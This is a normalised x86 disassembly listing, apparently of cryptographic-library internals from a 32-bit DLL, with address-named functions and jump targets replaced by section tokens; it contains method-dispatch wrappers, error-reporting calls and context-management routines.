test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x361
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x366
push r--data
push 0x65
push 0xb9
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d5b0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x44 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x372
push r--data
push 0x42
push 0x74
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x377
push r--data
push 0x65
push 0x74
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d620
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x44 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x383
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x388
push r--data
push 0x65
push 0xb7
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d680
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x48 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x394
push r--data
push 0x42
push 0x7d
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x399
push r--data
push 0x65
push 0x7d
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d6f0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x48 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x3a5
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x3aa
push r--data
push 0x65
push 0xba
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d750
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4c ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x3b6
push r--data
push 0x42
push 0x7b
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push eax
push edx
push esi
call ecx
add esp 0x18
pop esi
retn
push 0x3bb
push r--data
push 0x65
push 0x7b
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d7c0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x50 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x3c7
push r--data
push 0x42
push 0x7a
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
push edx
push esi
call ecx
add esp 0x14
pop esi
retn
push 0x3cc
push r--data
push 0x65
push 0x7a
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d830
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov ecx [ ebx ]
mov esi [ ecx + 0x54 ]
test esi esi
jne r-xdata
mov edi [ esp + 0x14 ]
mov eax [ edi ]
cmp ecx eax
jne r-xdata
push 0x3d7
push r--data
push 0x42
push 0x70
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x3dc
push r--data
push 0x65
push 0x70
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x18 ]
mov ecx [ edx ]
cmp eax ecx
jne r-xdata
mov eax [ esp + 0x1c ]
push ebp
mov ebp [ eax ]
cmp ecx ebp
pop ebp
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push eax
push edx
push edi
push ebx
call esi
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_1002d8b0
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov edx [ eax + 0x58 ]
test edx edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi ]
cmp eax ecx
jne r-xdata
push 0x3e7
push r--data
push 0x42
push 0x73
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push 0x3ec
push r--data
push 0x65
push 0x73
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esp + 0x14 ]
push ebx
mov ebx [ eax ]
cmp ecx ebx
pop ebx
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push eax
push esi
push edi
call edx
add esp 0x10
pop edi
pop esi
retn
sub_1002d920
mov edx [ esp + 0x4 ]
push esi
mov eax [ edx ]
mov ecx [ eax + 0x58 ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0xc ]
cmp eax [ ecx ]
je r-xdata
push 0x3f7
push r--data
push 0x42
jmp r-xdata
mov esi [ esp + 0x10 ]
push esi
push ecx
push edx
call [ eax + 0x5c ]
add esp 0xc
pop esi
retn
push 0x3fc
push r--data
push 0x65
push 0xd2
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d980
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x60 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x407
push r--data
push 0x42
push 0x76
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push edx
push esi
call ecx
add esp 0x8
pop esi
retn
push 0x40c
push r--data
push 0x65
push 0x76
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002d9e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x64 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x417
push r--data
push 0x42
push 0x77
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x10 ]
push eax
push edx
push esi
call ecx
add esp 0xc
pop esi
retn
push 0x41c
push r--data
push 0x65
push 0x77
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002da40
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov edx [ eax + 0x68 ]
test edx edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi ]
cmp eax ecx
jne r-xdata
push 0x427
push r--data
push 0x42
push 0x71
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push 0x42c
push r--data
push 0x65
push 0x71
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esp + 0x14 ]
push ebx
mov ebx [ eax ]
cmp ecx ebx
pop ebx
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push eax
push esi
push edi
call edx
add esp 0x10
pop edi
pop esi
retn
sub_1002dab0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x6c ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0xc ]
push edi
mov edi [ edx ]
cmp eax edi
pop edi
je r-xdata
push 0x437
push r--data
push 0x42
push 0x78
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0x10 ]
push eax
push edx
push esi
call ecx
add esp 0xc
pop esi
retn
push 0x43c
push r--data
push 0x65
push 0x78
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
sub_1002db10
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ eax ]
push edi
mov edi [ esi + 0x70 ]
test edi edi
jne r-xdata
mov edx [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
xor eax eax
test edx edx
jbe r-xdata
push 0x449
push r--data
push 0x42
jmp r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push ebx
push edx
mov edx [ esp + 0x20 ]
push edx
call edi
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx ebx
push 0x88
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x450
push r--data
push 0x65
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
mov ebp [ ecx ]
cmp esi [ ebp ]
jne r-xdata
sub_1002db90
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
test eax eax
mov [ esp ] eax
mov [ esp + 0x14 ] ecx
je r-xdata
xor edx edx
test ecx ecx
je r-xdata
push esi
mov esi [ esp + 0x20 ]
push esi
lea esi [ esp + 0x1c ]
push esi
lea esi [ esp + 0xc ]
push esi
push edx
mov edx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
push edx
push eax
call ecx
add esp 0x1c
pop esi
pop ecx
retn
mov ecx [ esp + 0x1c ]
push ecx
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x20 ]
push edx
push ecx
push eax
call sub_1004d990
add esp 0x1c
pop ecx
retn
mov edx 0x1
jmp r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x74 ]
test ecx ecx
jne r-xdata
sub_1002dc20
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
mov edx [ eax + 0x74 ]
test edx edx
jne r-xdata
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
push ecx
call sub_1004ebb0
add esp 0x4
retn
xor eax eax
retn
push ecx
call eax
add esp 0x4
retn
sub_1002dc50
push 0xd8
push r--data
push 0x2c
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
retn
push 0xdb
push r--data
push 0x41
push 0x6a
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1002dcb0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
push eax
call sub_1001d740
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push ebx
push edi
add edi 0x14
dec ebx
jne r-xdata
push edi
call sub_100298f0
add esp 0x4
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esi ]
mov eax ecx
mov edx [ ecx + 0x144 ]
push eax
mov [ esi + 0x4 ] edx
call sub_1001d740
mov eax [ esi + 0x4 ]
add esp 0x4
test eax eax
mov [ esi ] eax
jne r-xdata
mov edi [ esi ]
mov ebx 0x10
pop edi
pop ebx
sub_1002dd20
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov eax [ ebx + 0x24 ]
test eax eax
jne r-xdata
inc eax
pop esi
mov [ ebx + 0x24 ] eax
pop ebp
pop ebx
pop ecx
retn
mov ecx [ ebx + 0x28 ]
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ ebx + 0x18 ]
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x1c ]
cmp ecx eax
jne r-xdata
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x14 ]
mov edx [ esp + 0xc ]
pop esi
mov [ ecx + eax * 4 ] edx
mov eax [ ebx + 0x18 ]
inc eax
pop ebp
mov [ ebx + 0x18 ] eax
pop ebx
pop ecx
retn
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x20
mov esi [ esp + 0x14 ]
lea esi [ eax + eax * 2 ]
shr esi 0x1
mov [ esp + 0x14 ] esi
jmp r-xdata
push 0x108
push r--data
push 0x6d
push 0x81
push 0x3
call sub_1001de60
mov eax [ ebx + 0x24 ]
add esp 0x14
mov ecx [ ebx + 0x18 ]
test ecx ecx
je r-xdata
push 0x152
lea ecx [ esi * 4 ]
push r--data
push ecx
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
mov esi [ ebx + 0x14 ]
push edi
mov edi ebp
[ edi ] [ esi ]
mov esi [ esp + 0x18 ]
pop edi
mov [ ebx + 0x14 ] ebp
mov [ ebx + 0x1c ] esi
mov edx [ ebx + 0x14 ]
push edx
call sub_1001d740
add esp 0x4
sub_1002de00
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x18 ]
push esi
dec edx
push edi
mov [ eax + 0x18 ] edx
mov esi [ eax + 0x20 ]
mov ecx edx
mov edx [ eax + 0x14 ]
mov edi [ edx + ecx * 4 ]
cmp edi esi
jae r-xdata
dec ecx
mov [ eax + 0x24 ] ecx
retn
mov [ eax + 0x20 ] edi
pop edi
mov [ eax + 0x28 ] 0x0
pop esi
retn
mov ecx [ eax + 0xc ]
sub esi edi
lea edx [ ecx - 0x1 ]
sub ecx esi
mov [ eax + 0xc ] ecx
and edx 0xf
mov ecx esi
dec esi
test ecx ecx
je r-xdata
lea ecx [ esi + 0x1 ]
dec edx
mov esi [ eax + 0x4 ]
mov edx 0xf
mov esi [ esi + 0x140 ]
mov [ eax + 0x4 ] esi
jmp r-xdata
test edx edx
jne r-xdata
dec ecx
jne r-xdata
sub_1002de70
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x24 ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
cmp ecx eax
jne r-xdata
test ecx ecx
jne r-xdata
push 0x199
push r--data
push 0x148
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
je r-xdata
test cl 0xf
jne r-xdata
mov edx [ esi ]
jmp r-xdata
push 0x12a
push r--data
push 0x6d
push 0x74
push 0x3
mov [ esi + 0x28 ] 0x1
call sub_1001de60
add esp 0x14
push ebx
push ebp
mov ebx edi
mov ebp 0x10
mov edx [ esi + 0x4 ]
mov eax ecx
and eax 0xf
inc ecx
mov [ esi + 0xc ] ecx
lea eax [ eax + eax * 4 ]
lea edi [ edx + eax * 4 ]
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x144 ]
mov [ esi + 0x4 ] edx
mov eax ebx
add ebx 0x14
push eax
call sub_10029990
add esp 0x4
dec ebp
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ edi + 0x144 ] 0x0
mov [ edi + 0x140 ] eax
mov eax [ esi ]
pop ebp
pop ebx
test eax eax
jne r-xdata
push 0x0
push edi
call sub_10029cf0
mov eax [ esi + 0x20 ]
add esp 0x8
inc eax
mov [ esi + 0x20 ] eax
mov eax edi
pop edi
pop esi
retn
mov ecx [ esi + 0x8 ]
mov [ ecx + 0x144 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ esi ] edi
jmp r-xdata
test edi edi
jne r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
add ecx 0x10
inc eax
mov [ esi + 0x10 ] ecx
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1002df90
mov eax 0x18
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x24 ]
push edi
xor edi edi
cmp esi edi
jg r-xdata
mov edx [ rw-data ]
xor eax eax
cmp edx edi
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x18
retn
push 0x4dd
push r--data
push 0x81
push 0xae
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x18
retn
mov ecx r--data
mov esi [ eax * 8 + r--data ]
push ebp
xor ebp ebp
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] edi
call sub_1002dc50
mov ebx eax
test ebx ebx
jne r-xdata
inc eax
add ecx 0x8
cmp eax edx
jb r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
push 0x46d
jmp r-xdata
cmp [ ecx ] esi
je r-xdata
jmp r-xdata
push 0x474
call sub_100299b0
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
push r--data
push 0x41
test ebx ebx
pop ebp
je r-xdata
push ebp
call sub_1002d200
add esp 0x4
call sub_100299b0
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebx
call sub_1002dcb0
add esp 0x4
call sub_100299b0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
call sub_100299b0
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
call sub_100299b0
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi + 0x4 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
push 0x47b
push r--data
push 0x3
jmp r-xdata
mov edx [ esi + 0x8 ]
lea eax [ esp + 0x18 ]
push edx
push eax
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_10029950
add esp 0x4
push 0xaf
push 0x10
call sub_1001de60
add esp 0x14
push edi
call sub_1002c3f0
add esp 0x4
xor edi edi
mov ecx [ esi + 0xc ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
test edi edi
jne r-xdata
push eax
call sub_10029950
add esp 0x4
mov eax [ esi ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
cmp eax 0x196
mov eax [ esp + 0x1c ]
push ebx
push eax
push ecx
push edx
jne r-xdata
mov edx [ esp + 0x28 ]
push edx
push edi
call sub_1002cb50
add esp 0x8
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x18
retn
call sub_1004eca0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
call sub_1004ebe0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
push edi
call sub_1002d150
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
push 0x48b
push r--data
push 0x10
jmp r-xdata
push 0x483
push r--data
push 0x10
jmp r-xdata
mov eax [ esi + 0x10 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
push 0x492
push r--data
push 0x10
jmp r-xdata
push 0x498
push r--data
push 0x3
jmp r-xdata
mov edx [ esi + 0x14 ]
lea eax [ esp + 0x24 ]
push edx
push eax
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
push ebx
push ecx
push edx
push ebp
push edi
call sub_1002d550
add esp 0x14
test eax eax
jne r-xdata
mov eax [ esi + 0x18 ]
lea ecx [ esp + 0x20 ]
push eax
push ecx
call sub_100357a0
add esp 0x8
test eax eax
je r-xdata
push 0x49d
push r--data
push 0x10
jmp r-xdata
push 0x4a2
push r--data
push 0x3
jmp r-xdata
mov edx [ esi + 0x1c ]
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x20 ]
push ecx
push edx
push ebp
push edi
call sub_1002c970
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push 0x4a7
push r--data
push 0x10
jmp r-xdata
test ebp ebp
je r-xdata
mov ecx [ esi + 0x24 ]
push ecx
push eax
push edi
call sub_1002cb80
add esp 0xc
test eax eax
jne r-xdata
push 0x4ae
push r--data
push 0x10
jmp r-xdata
sub_1002e320
push esi
mov esi [ esp + 0x14 ]
push esi
call sub_1004ee00
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push ecx
mov ecx [ esp + 0x10 ]
push esi
push edx
mov edx [ esp + 0x14 ]
push ecx
push edx
call [ eax + 0x4 ]
add esp 0x14
pop esi
retn
pop esi
retn
sub_1002e360
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
push esi
call sub_10036220
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
pop esi
mov [ ecx ] 0x0
retn
mov ecx [ eax + 0xc ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push esi
push 0x0
push 0x0
push edx
push eax
call [ ecx + 0x4 ]
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
push esi
call sub_1004ef30
mov ecx [ esp + 0x20 ]
push esi
mov [ ecx ] eax
call sub_1004ef60
add esp 0xc
mov eax 0x1
pop esi
retn
sub_1002e3d0
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10036220
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push ecx
push esi
call [ eax + 0x8 ]
add esp 0x10
pop esi
retn
pop esi
retn
sub_1002e400
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax 0x1
retn
push 0x4b
push r--data
push 0x8
call sub_1001d4c0
mov ecx [ esp + 0x14 ]
add esp 0xc
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
test eax eax
mov [ ecx ] eax
je r-xdata
push 0x50
push r--data
push 0x41
push 0x72
push 0xa
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov eax 0x2
retn
sub_1002e460
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
call sub_100363f0
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x2
retn
mov eax 0x1
retn
push esi
mov esi [ esp + 0xc ]
mov edx [ esi ]
push edx
call sub_10036560
add esp 0x4
mov [ esi ] 0x0
mov eax 0x2
pop esi
retn
sub_1002e520
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_1004eff0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
lea ecx [ esp + 0x14 ]
push r--data
push ecx
push esi
call sub_100325c0
mov edx [ esp + 0x24 ]
push esi
mov [ edx ] eax
call sub_1004efb0
add esp 0x10
mov eax 0x1
pop esi
retn
mov eax [ esp + 0x18 ]
mov [ eax ] esi
xor eax eax
pop esi
retn
sub_1002e570
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_10029870
add eax 0x7
push 0x0
cdq
and edx 0x7
mov [ esp + 0xc ] 0x2
add eax edx
lea edx [ esp + 0x1c ]
sar eax 0x3
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0x14 ] edx
mov [ esp + 0x20 ] 0xff
call sub_1002eeb0
shl eax 0x1
push 0x10
push eax
push 0x1
call sub_1002eb00
add esp 0x28
retn
sub_1002e5d0
mov eax 0x4
call sub_1001d0d0
push esi
or esi 0xffffffff
call sub_1004ef80
test eax eax
mov [ esp + 0x4 ] eax
jne r-xdata
mov eax [ esp + 0x1c ]
push r--data
lea ecx [ esp + 0x1c ]
push eax
lea edx [ esp + 0xc ]
push ecx
push edx
call sub_10030ec0
add esp 0x10
test eax eax
je r-xdata
or eax 0xffffffff
pop esi
pop ecx
retn
mov ecx [ esp + 0x4 ]
push ecx
call sub_1004efb0
add esp 0x4
mov eax esi
pop esi
pop ecx
retn
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push ecx
push edx
push eax
call sub_1004f030
add esp 0x10
mov esi eax
sub_1002e650
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
test edi edi
jne r-xdata
mov ebp [ esp + 0x18 ]
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi ebp
push edi
call sub_10021790
add esp 0x4
mov esi eax
jmp r-xdata
mov eax [ esi ]
cmp eax 0x74
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test esi esi
jne r-xdata
cmp eax 0x198
jne r-xdata
je r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push ecx
call sub_10022ae0
push eax
call sub_100238a0
add esp 0x8
cmp eax 0x6
je r-xdata
mov ebx 0x58
mov ebx 0x12
jmp r-xdata
cmp eax 0x6
je r-xdata
or bh 0x1
cmp eax 0x74
je r-xdata
mov ebx 0x31
jmp r-xdata
cmp eax 0x1c
jne r-xdata
test ebp ebp
jne r-xdata
or bh 0x10
or bh 0x2
jmp r-xdata
cmp eax 0x198
jne r-xdata
mov ebx 0x44
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
push esi
call sub_10023940
add esp 0x4
push esi
call sub_100234b0
add esp 0x4
cmp eax 0x80
jg r-xdata
or bh 0x4
jmp r-xdata
sub_1002e720
mov eax 0x58
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x60 ]
push ebp
push esi
push edi
mov edi [ esp + 0x74 ]
mov esi [ esp + 0x78 ]
xor edx edx
mov [ edi ] 0x0
mov ebp [ ebx ]
lea ecx [ ebp + 0x2c ]
push 0x63
push r--data
push 0x6e
push 0x6b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn
cmp [ esi ] eax
je r-xdata
mov eax [ ebp + 0x24 ]
test eax eax
jne r-xdata
inc edx
add ecx 0x4
cmp edx 0x4
jl r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_1002aa30
lea ecx [ esp + 0x1c ]
push ebx
push ecx
call sub_1002ac20
mov eax [ ebx ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ch 0x8
je r-xdata
push 0x68
push r--data
push 0x68
push 0x6b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x58
retn
mov eax [ ecx ]
test eax eax
je r-xdata
lea eax [ esp + 0x74 ]
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_1002aba0
mov ecx [ esi + 0xc ]
mov edx [ esp + 0x7c ]
mov eax [ ebx ]
push ecx
mov ecx [ esp + 0x84 ]
push edi
push edx
push ecx
mov ecx [ eax ]
lea edx [ esp + 0x44 ]
push edx
push ecx
call [ eax + 0x24 ]
add esp 0x24
mov ecx [ esi + 0xc ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
lea edx [ esp + 0x10 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x70 ]
push edx
mov edx [ eax ]
push edi
push ecx
push 0xffffffff
push 0x0
push edx
call [ eax + 0x24 ]
add esp 0x18
jmp r-xdata
lea edx [ esp + 0x18 ]
mov esi eax
push edx
call sub_1002b000
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
